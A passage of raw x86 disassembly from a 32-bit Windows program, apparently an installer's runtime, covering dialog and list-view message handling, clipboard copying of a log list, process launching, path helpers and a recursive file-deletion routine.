  4057a8:	50                   	push   %eax
  4057a9:	53                   	push   %ebx
  4057aa:	68 61 10 00 00       	push   $0x1061
  4057af:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4057b2:	ff 75 fc             	push   -0x4(%ebp)
  4057b5:	ff d6                	call   *%esi
  4057b7:	b8 00 40 00 00       	mov    $0x4000,%eax
  4057bc:	50                   	push   %eax
  4057bd:	50                   	push   %eax
  4057be:	68 36 10 00 00       	push   $0x1036
  4057c3:	ff 75 fc             	push   -0x4(%ebp)
  4057c6:	ff d6                	call   *%esi
  4057c8:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4057cb:	7c 1c                	jl     0x4057e9
  4057cd:	ff 75 0c             	push   0xc(%ebp)
  4057d0:	53                   	push   %ebx
  4057d1:	68 01 10 00 00       	push   $0x1001
  4057d6:	ff 75 fc             	push   -0x4(%ebp)
  4057d9:	ff d6                	call   *%esi
  4057db:	ff 75 0c             	push   0xc(%ebp)
  4057de:	53                   	push   %ebx
  4057df:	68 26 10 00 00       	push   $0x1026
  4057e4:	ff 75 fc             	push   -0x4(%ebp)
  4057e7:	ff d6                	call   *%esi
  4057e9:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4057ec:	7c 0e                	jl     0x4057fc
  4057ee:	ff 75 10             	push   0x10(%ebp)
  4057f1:	53                   	push   %ebx
  4057f2:	68 24 10 00 00       	push   $0x1024
  4057f7:	ff 75 fc             	push   -0x4(%ebp)
  4057fa:	ff d6                	call   *%esi
  4057fc:	8b 45 14             	mov    0x14(%ebp),%eax
  4057ff:	ff 70 30             	push   0x30(%eax)
  405802:	6a 1b                	push   $0x1b
  405804:	ff 75 08             	push   0x8(%ebp)
  405807:	e8 86 ec ff ff       	call   0x404492
  40580c:	f6 05 7c a2 42 00 03 	testb  $0x3,0x42a27c
  405813:	74 34                	je     0x405849
  405815:	53                   	push   %ebx
  405816:	ff 35 30 92 42 00    	push   0x429230
  40581c:	ff 15 50 82 40 00    	call   *0x408250
  405822:	f6 05 7c a2 42 00 02 	testb  $0x2,0x42a27c
  405829:	75 0d                	jne    0x405838
  40582b:	6a 08                	push   $0x8
  40582d:	ff 75 fc             	push   -0x4(%ebp)
  405830:	ff 15 50 82 40 00    	call   *0x408250
  405836:	eb 06                	jmp    0x40583e
  405838:	89 1d 30 92 42 00    	mov    %ebx,0x429230
  40583e:	ff 35 28 92 42 00    	push   0x429228
  405844:	e8 7e ec ff ff       	call   0x4044c7
  405849:	68 ec 03 00 00       	push   $0x3ec
  40584e:	ff 75 08             	push   0x8(%ebp)
  405851:	ff d7                	call   *%edi
  405853:	68 00 00 30 75       	push   $0x75300000
  405858:	8b f8                	mov    %eax,%edi
  40585a:	53                   	push   %ebx
  40585b:	68 01 04 00 00       	push   $0x401
  405860:	57                   	push   %edi
  405861:	ff d6                	call   *%esi
  405863:	f6 05 7c a2 42 00 04 	testb  $0x4,0x42a27c
  40586a:	0f 84 fc 01 00 00    	je     0x405a6c
  405870:	ff 75 10             	push   0x10(%ebp)
  405873:	53                   	push   %ebx
  405874:	68 09 04 00 00       	push   $0x409
  405879:	57                   	push   %edi
  40587a:	ff d6                	call   *%esi
  40587c:	ff 75 0c             	push   0xc(%ebp)
  40587f:	53                   	push   %ebx
  405880:	68 01 20 00 00       	push   $0x2001
  405885:	57                   	push   %edi
  405886:	ff d6                	call   *%esi
  405888:	e9 df 01 00 00       	jmp    0x405a6c
  40588d:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405894:	75 28                	jne    0x4058be
  405896:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405899:	50                   	push   %eax
  40589a:	53                   	push   %ebx
  40589b:	68 ec 03 00 00       	push   $0x3ec
  4058a0:	ff 75 08             	push   0x8(%ebp)
  4058a3:	ff 15 64 82 40 00    	call   *0x408264
  4058a9:	50                   	push   %eax
  4058aa:	68 77 56 40 00       	push   $0x405677
  4058af:	53                   	push   %ebx
  4058b0:	53                   	push   %ebx
  4058b1:	ff 15 ac 80 40 00    	call   *0x4080ac
  4058b7:	50                   	push   %eax
  4058b8:	ff 15 24 81 40 00    	call   *0x408124
  4058be:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4058c5:	8b 3d 50 82 40 00    	mov    0x408250,%edi
  4058cb:	75 1c                	jne    0x4058e9
  4058cd:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  4058d3:	75 39                	jne    0x40590e
  4058d5:	53                   	push   %ebx
  4058d6:	ff 35 30 92 42 00    	push   0x429230
  4058dc:	ff d7                	call   *%edi
  4058de:	6a 08                	push   $0x8
  4058e0:	56                   	push   %esi
  4058e1:	ff d7                	call   *%edi
  4058e3:	56                   	push   %esi
  4058e4:	e8 de eb ff ff       	call   0x4044c7
  4058e9:	33 f6                	xor    %esi,%esi
  4058eb:	46                   	inc    %esi
  4058ec:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  4058f3:	75 54                	jne    0x405949
  4058f5:	39 1d 2c 92 42 00    	cmp    %ebx,0x42922c
  4058fb:	74 26                	je     0x405923
  4058fd:	6a 78                	push   $0x78
  4058ff:	c7 05 18 1f 42 00 02 	movl   $0x2,0x421f18
  405906:	00 00 00 
  405909:	e8 5d eb ff ff       	call   0x40446b
  40590e:	ff 75 14             	push   0x14(%ebp)
  405911:	ff 75 10             	push   0x10(%ebp)
  405914:	ff 75 0c             	push   0xc(%ebp)
  405917:	e8 dd eb ff ff       	call   0x4044f9
  40591c:	5f                   	pop    %edi
  40591d:	5e                   	pop    %esi
  40591e:	5b                   	pop    %ebx
  40591f:	c9                   	leave
  405920:	c2 10 00             	ret    $0x10
  405923:	6a 08                	push   $0x8
  405925:	ff 35 68 a2 42 00    	push   0x42a268
  40592b:	ff d7                	call   *%edi
  40592d:	39 1d 0c a3 42 00    	cmp    %ebx,0x42a30c
  405933:	75 0e                	jne    0x405943
  405935:	a1 20 27 42 00       	mov    0x422720,%eax
  40593a:	53                   	push   %ebx
  40593b:	ff 70 34             	push   0x34(%eax)
  40593e:	e8 61 fc ff ff       	call   0x4055a4
  405943:	56                   	push   %esi
  405944:	e8 22 eb ff ff       	call   0x40446b
  405949:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  40594d:	75 bf                	jne    0x40590e
  40594f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405952:	39 45 10             	cmp    %eax,0x10(%ebp)
  405955:	75 b7                	jne    0x40590e
  405957:	53                   	push   %ebx
  405958:	53                   	push   %ebx
  405959:	68 04 10 00 00       	push   $0x1004
  40595e:	50                   	push   %eax
  40595f:	ff 15 80 82 40 00    	call   *0x408280
  405965:	3b c3                	cmp    %ebx,%eax
  405967:	89 45 0c             	mov    %eax,0xc(%ebp)
  40596a:	0f 8e fc 00 00 00    	jle    0x405a6c
  405970:	ff 15 90 82 40 00    	call   *0x408290
  405976:	6a e1                	push   $0xffffffe1
  405978:	53                   	push   %ebx
  405979:	8b f8                	mov    %eax,%edi
  40597b:	e8 f9 0b 00 00       	call   0x406579
  405980:	50                   	push   %eax
  405981:	56                   	push   %esi
  405982:	53                   	push   %ebx
  405983:	57                   	push   %edi
  405984:	ff 15 c8 81 40 00    	call   *0x4081c8
  40598a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40598d:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405991:	c1 e9 10             	shr    $0x10,%ecx
  405994:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405998:	0f bf c9             	movswl %cx,%ecx
  40599b:	75 13                	jne    0x4059b0
  40599d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4059a0:	50                   	push   %eax
  4059a1:	ff 75 fc             	push   -0x4(%ebp)
  4059a4:	ff 15 10 82 40 00    	call   *0x408210
  4059aa:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4059ad:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4059b0:	53                   	push   %ebx
  4059b1:	ff 75 08             	push   0x8(%ebp)
  4059b4:	53                   	push   %ebx
  4059b5:	51                   	push   %ecx
  4059b6:	50                   	push   %eax
  4059b7:	68 80 01 00 00       	push   $0x180
  4059bc:	57                   	push   %edi
  4059bd:	ff 15 cc 81 40 00    	call   *0x4081cc
  4059c3:	3b c6                	cmp    %esi,%eax
  4059c5:	0f 85 a1 00 00 00    	jne    0x405a6c
  4059cb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4059ce:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  4059d1:	c7 45 d4 48 37 42 00 	movl   $0x423748,-0x2c(%ebp)
  4059d8:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  4059df:	89 45 08             	mov    %eax,0x8(%ebp)
  4059e2:	bf 73 10 00 00       	mov    $0x1073,%edi
  4059e7:	ff 4d 08             	decl   0x8(%ebp)
  4059ea:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4059ed:	50                   	push   %eax
  4059ee:	ff 75 08             	push   0x8(%ebp)
  4059f1:	57                   	push   %edi
  4059f2:	ff 75 fc             	push   -0x4(%ebp)
  4059f5:	ff 15 80 82 40 00    	call   *0x408280
  4059fb:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4059fe:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405a02:	75 e3                	jne    0x4059e7
  405a04:	53                   	push   %ebx
  405a05:	ff 15 d0 81 40 00    	call   *0x4081d0
  405a0b:	ff 15 8c 82 40 00    	call   *0x40828c
  405a11:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405a14:	50                   	push   %eax
  405a15:	6a 42                	push   $0x42
  405a17:	ff 15 38 81 40 00    	call   *0x408138
  405a1d:	50                   	push   %eax
  405a1e:	89 45 08             	mov    %eax,0x8(%ebp)
  405a21:	ff 15 b0 80 40 00    	call   *0x4080b0
  405a27:	8b f0                	mov    %eax,%esi
  405a29:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405a2c:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405a2f:	50                   	push   %eax
  405a30:	53                   	push   %ebx
  405a31:	57                   	push   %edi
  405a32:	ff 75 fc             	push   -0x4(%ebp)
  405a35:	ff 15 80 82 40 00    	call   *0x408280
  405a3b:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405a3e:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405a43:	46                   	inc    %esi
  405a44:	46                   	inc    %esi
  405a45:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  405a4a:	46                   	inc    %esi
  405a4b:	46                   	inc    %esi
  405a4c:	43                   	inc    %ebx
  405a4d:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405a50:	7c d7                	jl     0x405a29
  405a52:	ff 75 08             	push   0x8(%ebp)
  405a55:	ff 15 b4 80 40 00    	call   *0x4080b4
  405a5b:	ff 75 08             	push   0x8(%ebp)
  405a5e:	6a 0d                	push   $0xd
  405a60:	ff 15 d4 81 40 00    	call   *0x4081d4
  405a66:	ff 15 d8 81 40 00    	call   *0x4081d8
  405a6c:	33 c0                	xor    %eax,%eax
  405a6e:	e9 a9 fe ff ff       	jmp    0x40591c
  405a73:	55                   	push   %ebp
  405a74:	8b ec                	mov    %esp,%ebp
  405a76:	83 ec 20             	sub    $0x20,%esp
  405a79:	b8 f8 83 40 00       	mov    $0x4083f8,%eax
  405a7e:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405a82:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405a85:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405a88:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405a8b:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405a8f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405a93:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405a96:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405a99:	56                   	push   %esi
  405a9a:	50                   	push   %eax
  405a9b:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405a9f:	ff 75 08             	push   0x8(%ebp)
  405aa2:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405aa8:	c7 45 f0 e8 83 40 00 	movl   $0x4083e8,-0x10(%ebp)
  405aaf:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405ab6:	ff 15 a4 80 40 00    	call   *0x4080a4
  405abc:	85 c0                	test   %eax,%eax
  405abe:	74 04                	je     0x405ac4
  405ac0:	33 c0                	xor    %eax,%eax
  405ac2:	eb 27                	jmp    0x405aeb
  405ac4:	8b 35 a8 80 40 00    	mov    0x4080a8,%esi
  405aca:	ff d6                	call   *%esi
  405acc:	3d b7 00 00 00       	cmp    $0xb7,%eax
  405ad1:	75 18                	jne    0x405aeb
  405ad3:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405ad6:	50                   	push   %eax
  405ad7:	68 07 00 00 80       	push   $0x80000007
  405adc:	ff 75 08             	push   0x8(%ebp)
  405adf:	ff 15 28 80 40 00    	call   *0x408028
  405ae5:	85 c0                	test   %eax,%eax
  405ae7:	75 d7                	jne    0x405ac0
  405ae9:	ff d6                	call   *%esi
  405aeb:	5e                   	pop    %esi
  405aec:	c9                   	leave
  405aed:	c2 04 00             	ret    $0x4
  405af0:	6a 00                	push   $0x0
  405af2:	ff 74 24 08          	push   0x8(%esp)
  405af6:	ff 15 a4 80 40 00    	call   *0x4080a4
  405afc:	85 c0                	test   %eax,%eax
  405afe:	74 04                	je     0x405b04
  405b00:	33 c0                	xor    %eax,%eax
  405b02:	eb 06                	jmp    0x405b0a
  405b04:	ff 15 a8 80 40 00    	call   *0x4080a8
  405b0a:	c2 04 00             	ret    $0x4
  405b0d:	6a 06                	push   $0x6
  405b0f:	e8 1d 0e 00 00       	call   0x406931
  405b14:	85 c0                	test   %eax,%eax
  405b16:	74 0a                	je     0x405b22
  405b18:	ff d0                	call   *%eax
  405b1a:	85 c0                	test   %eax,%eax
  405b1c:	74 04                	je     0x405b22
  405b1e:	33 c0                	xor    %eax,%eax
  405b20:	40                   	inc    %eax
  405b21:	c3                   	ret
  405b22:	33 c0                	xor    %eax,%eax
  405b24:	c3                   	ret
  405b25:	55                   	push   %ebp
  405b26:	8b ec                	mov    %esp,%ebp
  405b28:	83 ec 10             	sub    $0x10,%esp
  405b2b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405b2e:	c7 05 50 67 42 00 44 	movl   $0x44,0x426750
  405b35:	00 00 00 
  405b38:	50                   	push   %eax
  405b39:	33 c0                	xor    %eax,%eax
  405b3b:	68 50 67 42 00       	push   $0x426750
  405b40:	50                   	push   %eax
  405b41:	50                   	push   %eax
  405b42:	68 00 00 00 04       	push   $0x4000000
  405b47:	50                   	push   %eax
  405b48:	50                   	push   %eax
  405b49:	50                   	push   %eax
  405b4a:	ff 75 08             	push   0x8(%ebp)
  405b4d:	50                   	push   %eax
  405b4e:	ff 15 a0 80 40 00    	call   *0x4080a0
  405b54:	85 c0                	test   %eax,%eax
  405b56:	74 0c                	je     0x405b64
  405b58:	ff 75 f4             	push   -0xc(%ebp)
  405b5b:	ff 15 24 81 40 00    	call   *0x408124
  405b61:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405b64:	c9                   	leave
  405b65:	c2 04 00             	ret    $0x4
  405b68:	8b 44 24 04          	mov    0x4(%esp),%eax
  405b6c:	50                   	push   %eax
  405b6d:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405b71:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405b77:	ff 15 88 81 40 00    	call   *0x408188
  405b7d:	c2 04 00             	ret    $0x4
  405b80:	ff 25 bc 81 40 00    	jmp    *0x4081bc
  405b86:	68 00 04 00 00       	push   $0x400
  405b8b:	ff 74 24 0c          	push   0xc(%esp)
  405b8f:	ff 74 24 0c          	push   0xc(%esp)
  405b93:	ff 35 38 92 42 00    	push   0x429238
  405b99:	ff 15 b8 81 40 00    	call   *0x4081b8
  405b9f:	c2 08 00             	ret    $0x8
  405ba2:	8b 44 24 08          	mov    0x8(%esp),%eax
  405ba6:	8b c8                	mov    %eax,%ecx
  405ba8:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405bae:	83 3d 20 a3 42 00 00 	cmpl   $0x0,0x42a320
  405bb5:	74 05                	je     0x405bbc
  405bb7:	c1 e8 15             	shr    $0x15,%eax
  405bba:	75 47                	jne    0x405c03
  405bbc:	83 3d 28 a3 42 00 00 	cmpl   $0x0,0x42a328
  405bc3:	74 06                	je     0x405bcb
  405bc5:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405bcb:	a1 68 a2 42 00       	mov    0x42a268,%eax
  405bd0:	68 e8 a3 40 00       	push   $0x40a3e8
  405bd5:	a3 ec a3 40 00       	mov    %eax,0x40a3ec
  405bda:	a1 60 a2 42 00       	mov    0x42a260,%eax
  405bdf:	a3 f0 a3 40 00       	mov    %eax,0x40a3f0
  405be4:	8b 44 24 08          	mov    0x8(%esp),%eax
  405be8:	a3 f4 a3 40 00       	mov    %eax,0x40a3f4
  405bed:	c7 05 f8 a3 40 00 60 	movl   $0x429260,0x40a3f8
  405bf4:	92 42 00 
  405bf7:	89 0d fc a3 40 00    	mov    %ecx,0x40a3fc
  405bfd:	ff 15 b4 81 40 00    	call   *0x4081b4
  405c03:	c2 08 00             	ret    $0x8
  405c06:	56                   	push   %esi
  405c07:	8b 74 24 08          	mov    0x8(%esp),%esi
  405c0b:	57                   	push   %edi
  405c0c:	56                   	push   %esi
  405c0d:	e8 fb 03 00 00       	call   0x40600d
  405c12:	8b f8                	mov    %eax,%edi
  405c14:	83 ff ff             	cmp    $0xffffffff,%edi
  405c17:	74 2e                	je     0x405c47
  405c19:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405c1e:	56                   	push   %esi
  405c1f:	74 08                	je     0x405c29
  405c21:	ff 15 9c 80 40 00    	call   *0x40809c
  405c27:	eb 06                	jmp    0x405c2f
  405c29:	ff 15 70 81 40 00    	call   *0x408170
  405c2f:	85 c0                	test   %eax,%eax
  405c31:	74 05                	je     0x405c38
  405c33:	33 c0                	xor    %eax,%eax
  405c35:	40                   	inc    %eax
  405c36:	eb 11                	jmp    0x405c49
  405c38:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405c3d:	75 08                	jne    0x405c47
  405c3f:	57                   	push   %edi
  405c40:	56                   	push   %esi
  405c41:	ff 15 00 81 40 00    	call   *0x408100
  405c47:	33 c0                	xor    %eax,%eax
  405c49:	5f                   	pop    %edi
  405c4a:	5e                   	pop    %esi
  405c4b:	c2 08 00             	ret    $0x8
  405c4e:	55                   	push   %ebp
  405c4f:	8b ec                	mov    %esp,%ebp
  405c51:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405c57:	53                   	push   %ebx
  405c58:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405c5b:	56                   	push   %esi
  405c5c:	57                   	push   %edi
  405c5d:	8b 7d 08             	mov    0x8(%ebp),%edi
  405c60:	8b c3                	mov    %ebx,%eax
  405c62:	83 e0 04             	and    $0x4,%eax
  405c65:	57                   	push   %edi
  405c66:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405c69:	e8 ab 02 00 00       	call   0x405f19
  405c6e:	f6 c3 08             	test   $0x8,%bl
  405c71:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405c74:	74 17                	je     0x405c8d
  405c76:	57                   	push   %edi
  405c77:	ff 15 70 81 40 00    	call   *0x408170
  405c7d:	f7 d8                	neg    %eax
  405c7f:	1b c0                	sbb    %eax,%eax
  405c81:	40                   	inc    %eax
  405c82:	01 05 08 a3 42 00    	add    %eax,0x42a308
  405c88:	e9 7d 01 00 00       	jmp    0x405e0a
  405c8d:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405c90:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405c94:	74 11                	je     0x405ca7
  405c96:	85 c0                	test   %eax,%eax
  405c98:	0f 84 1a 01 00 00    	je     0x405db8
  405c9e:	f6 c3 02             	test   $0x2,%bl
  405ca1:	0f 84 11 01 00 00    	je     0x405db8
  405ca7:	be 50 57 42 00       	mov    $0x425750,%esi
  405cac:	57                   	push   %edi
  405cad:	56                   	push   %esi
  405cae:	e8 89 08 00 00       	call   0x40653c
  405cb3:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405cb7:	74 0d                	je     0x405cc6
  405cb9:	68 9c a5 40 00       	push   $0x40a59c
  405cbe:	56                   	push   %esi
  405cbf:	e8 94 08 00 00       	call   0x406558
  405cc4:	eb 06                	jmp    0x405ccc
  405cc6:	57                   	push   %edi
  405cc7:	e8 91 01 00 00       	call   0x405e5d
  405ccc:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405cd0:	75 0a                	jne    0x405cdc
  405cd2:	66 83 3d 50 57 42 00 	cmpw   $0x5c,0x425750
  405cd9:	5c 
  405cda:	75 0b                	jne    0x405ce7
  405cdc:	68 14 a0 40 00       	push   $0x40a014
  405ce1:	57                   	push   %edi
  405ce2:	e8 71 08 00 00       	call   0x406558
  405ce7:	57                   	push   %edi
  405ce8:	e8 65 08 00 00       	call   0x406552
  405ced:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405cf0:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405cf6:	50                   	push   %eax
  405cf7:	56                   	push   %esi
  405cf8:	ff 15 6c 81 40 00    	call   *0x40816c
  405cfe:	8b f0                	mov    %eax,%esi
  405d00:	83 fe ff             	cmp    $0xffffffff,%esi
  405d03:	0f 84 a4 00 00 00    	je     0x405dad
  405d09:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405d10:	2e 
  405d11:	75 1e                	jne    0x405d31
  405d13:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405d1a:	00 
  405d1b:	74 73                	je     0x405d90
  405d1d:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405d24:	2e 
  405d25:	75 0a                	jne    0x405d31
  405d27:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405d2e:	00 
  405d2f:	74 5f                	je     0x405d90
  405d31:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405d37:	50                   	push   %eax
  405d38:	53                   	push   %ebx
  405d39:	e8 fe 07 00 00       	call   0x40653c
  405d3e:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405d45:	74 15                	je     0x405d5c
  405d47:	8b 45 0c             	mov    0xc(%ebp),%eax
  405d4a:	83 e0 03             	and    $0x3,%eax
  405d4d:	3c 03                	cmp    $0x3,%al
  405d4f:	75 3f                	jne    0x405d90
  405d51:	ff 75 0c             	push   0xc(%ebp)
  405d54:	57                   	push   %edi
  405d55:	e8 f4 fe ff ff       	call   0x405c4e
  405d5a:	eb 34                	jmp    0x405d90
  405d5c:	ff 75 fc             	push   -0x4(%ebp)
  405d5f:	57                   	push   %edi
  405d60:	e8 a1 fe ff ff       	call   0x405c06
  405d65:	85 c0                	test   %eax,%eax
  405d67:	75 1f                	jne    0x405d88
  405d69:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405d6c:	74 12                	je     0x405d80
  405d6e:	57                   	push   %edi
  405d6f:	6a f1                	push   $0xfffffff1
  405d71:	e8 2e f8 ff ff       	call   0x4055a4
  405d76:	6a 00                	push   $0x0
  405d78:	57                   	push   %edi
  405d79:	e8 84 05 00 00       	call   0x406302
  405d7e:	eb 10                	jmp    0x405d90
  405d80:	ff 05 08 a3 42 00    	incl   0x42a308
  405d86:	eb 08                	jmp    0x405d90
  405d88:	57                   	push   %edi
  405d89:	6a f2                	push   $0xfffffff2
  405d8b:	e8 14 f8 ff ff       	call   0x4055a4
  405d90:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405d96:	50                   	push   %eax
  405d97:	56                   	push   %esi
  405d98:	ff 15 68 81 40 00    	call   *0x408168
  405d9e:	85 c0                	test   %eax,%eax
  405da0:	0f 85 63 ff ff ff    	jne    0x405d09
  405da6:	56                   	push   %esi
  405da7:	ff 15 64 81 40 00    	call   *0x408164
  405dad:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405db1:	74 05                	je     0x405db8
  405db3:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405db8:	33 f6                	xor    %esi,%esi
  405dba:	39 75 08             	cmp    %esi,0x8(%ebp)
  405dbd:	74 4b                	je     0x405e0a
  405dbf:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405dc2:	75 08                	jne    0x405dcc
  405dc4:	ff 05 08 a3 42 00    	incl   0x42a308
  405dca:	eb 3e                	jmp    0x405e0a
  405dcc:	57                   	push   %edi
  405dcd:	e8 c8 0a 00 00       	call   0x40689a
  405dd2:	85 c0                	test   %eax,%eax
  405dd4:	74 34                	je     0x405e0a
  405dd6:	57                   	push   %edi
  405dd7:	e8 35 00 00 00       	call   0x405e11
  405ddc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405ddf:	0c 01                	or     $0x1,%al
  405de1:	50                   	push   %eax
  405de2:	57                   	push   %edi
  405de3:	e8 1e fe ff ff       	call   0x405c06
  405de8:	85 c0                	test   %eax,%eax
  405dea:	75 16                	jne    0x405e02
  405dec:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405def:	74 d3                	je     0x405dc4
  405df1:	57                   	push   %edi
  405df2:	6a f1                	push   $0xfffffff1
  405df4:	e8 ab f7 ff ff       	call   0x4055a4
  405df9:	56                   	push   %esi
  405dfa:	57                   	push   %edi
  405dfb:	e8 02 05 00 00       	call   0x406302
  405e00:	eb 08                	jmp    0x405e0a
  405e02:	57                   	push   %edi
  405e03:	6a e5                	push   $0xffffffe5
  405e05:	e8 9a f7 ff ff       	call   0x4055a4
  405e0a:	5f                   	pop    %edi
  405e0b:	5e                   	pop    %esi
  405e0c:	5b                   	pop    %ebx
  405e0d:	c9                   	leave
  405e0e:	c2 08 00             	ret    $0x8
  405e11:	56                   	push   %esi
  405e12:	8b 74 24 08          	mov    0x8(%esp),%esi
  405e16:	56                   	push   %esi
  405e17:	e8 36 07 00 00       	call   0x406552
  405e1c:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405e1f:	50                   	push   %eax
  405e20:	56                   	push   %esi
  405e21:	ff 15 b0 81 40 00    	call   *0x4081b0
  405e27:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405e2b:	74 0b                	je     0x405e38
  405e2d:	68 14 a0 40 00       	push   $0x40a014
  405e32:	56                   	push   %esi
  405e33:	e8 20 07 00 00       	call   0x406558
  405e38:	8b c6                	mov    %esi,%eax
  405e3a:	5e                   	pop    %esi
  405e3b:	c2 04 00             	ret    $0x4
  405e3e:	8b 44 24 04          	mov    0x4(%esp),%eax
  405e42:	eb 0e                	jmp    0x405e52
  405e44:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405e49:	74 0f                	je     0x405e5a
  405e4b:	50                   	push   %eax
  405e4c:	ff 15 30 82 40 00    	call   *0x408230
  405e52:	66 8b 08             	mov    (%eax),%cx
  405e55:	66 85 c9             	test   %cx,%cx
  405e58:	75 ea                	jne    0x405e44
  405e5a:	c2 08 00             	ret    $0x8
  405e5d:	56                   	push   %esi
  405e5e:	8b 74 24 08          	mov    0x8(%esp),%esi
  405e62:	56                   	push   %esi
  405e63:	e8 ea 06 00 00       	call   0x406552
  405e68:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405e6b:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405e6f:	74 0c                	je     0x405e7d
  405e71:	50                   	push   %eax
  405e72:	56                   	push   %esi
  405e73:	ff 15 b0 81 40 00    	call   *0x4081b0
  405e79:	3b c6                	cmp    %esi,%eax
  405e7b:	77 ee                	ja     0x405e6b
  405e7d:	66 83 20 00          	andw   $0x0,(%eax)
  405e81:	83 c0 02             	add    $0x2,%eax
  405e84:	5e                   	pop    %esi
  405e85:	c2 04 00             	ret    $0x4
  405e88:	8b 54 24 04          	mov    0x4(%esp),%edx
  405e8c:	66 8b 0a             	mov    (%edx),%cx
  405e8f:	8b c1                	mov    %ecx,%eax
  405e91:	0c 20                	or     $0x20,%al
  405e93:	66 83 f9 5c          	cmp    $0x5c,%cx
  405e97:	75 06                	jne    0x405e9f
  405e99:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405e9d:	74 13                	je     0x405eb2
  405e9f:	66 3d 61 00          	cmp    $0x61,%ax
  405ea3:	72 12                	jb     0x405eb7
  405ea5:	66 3d 7a 00          	cmp    $0x7a,%ax
  405ea9:	77 0c                	ja     0x405eb7
  405eab:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405eb0:	75 05                	jne    0x405eb7
  405eb2:	33 c0                	xor    %eax,%eax
  405eb4:	40                   	inc    %eax
  405eb5:	eb 02                	jmp    0x405eb9
  405eb7:	33 c0                	xor    %eax,%eax
  405eb9:	c2 04 00             	ret    $0x4
  405ebc:	53                   	push   %ebx
  405ebd:	56                   	push   %esi
  405ebe:	8b 35 30 82 40 00    	mov    0x408230,%esi
  405ec4:	57                   	push   %edi
  405ec5:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405ec9:	57                   	push   %edi
  405eca:	ff d6                	call   *%esi
  405ecc:	8b d8                	mov    %eax,%ebx
  405ece:	53                   	push   %ebx
  405ecf:	ff d6                	call   *%esi
  405ed1:	66 8b 0f             	mov    (%edi),%cx
  405ed4:	66 85 c9             	test   %cx,%cx
  405ed7:	74 12                	je     0x405eeb
